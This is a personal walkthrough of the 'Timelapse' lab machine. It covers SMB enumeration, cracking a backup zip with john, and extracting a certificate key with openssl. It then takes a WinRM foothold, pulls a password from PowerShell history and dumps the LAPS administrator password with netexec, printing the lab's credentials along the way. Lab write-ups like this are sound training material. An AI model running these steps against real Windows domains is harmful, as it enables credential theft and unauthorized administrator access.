# 📦 Timelapse

I start off by scanning open ports:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

first i add timelaps.htb to my hosts file

Then i try conecting though RPCCLIENT anonymous but got denied, then SMB shares enum:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

I download everything in the share and see some interesting stuff:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

There is a password to unzip the backup zip so i use zip2john to get the hash:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

```
john  --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt 
```

then i get my hash, i'm able to unzip and see the pfx file but there is also a password:

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>thuglegacy</p></figcaption></figure>

Then to extract the keys ->

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```
#to see the content:
openssl pkcs12 -in legacyy_dev_auth.pfx
#to dl the key:
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
#to dl the cert:
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert
```

**`-nocerts`** → Tells OpenSSL to extract **only** the private key (skip the certificates).

**`-nodes`** → **Disables encryption** on the private key (otherwise, OpenSSL would ask for a passphrase)

**`-nokeys`** → Tells OpenSSL to extract **only** the certificate(s) (skip the private key).

Now that we have a private key i can try and use evil-winrm with --ssl:

```
evil-winrm -S -i <IP> -c key.cert -k key.pem
```

and we are able to get a foothold:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
`gci -force .` will show hidden files in a directory
{% endhint %}

Then we have to enumerate and check a powershell file that is used when you connect on multiple computers in a domain with the same account, this file will follow you as your history:

```
C:\Users\legacyy\Appdata\Roaming\Microsoft\Windows\Powershell\Psreadline
```

and in that file we find a consolehost log file ->

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</p></figcaption></figure>

Winpeas catches this file. Now we can connect:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

After looking at our groups we can see some stuff:

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/#extract-laps-password" %}

We can see there is a netexec module for laps exploit:

```
nxc smb 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
nxc ldap 10.129.227.113 -u 'Administrator' -p 'D!YT07abvZ0,1Xy%Mf3$8+R8'
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
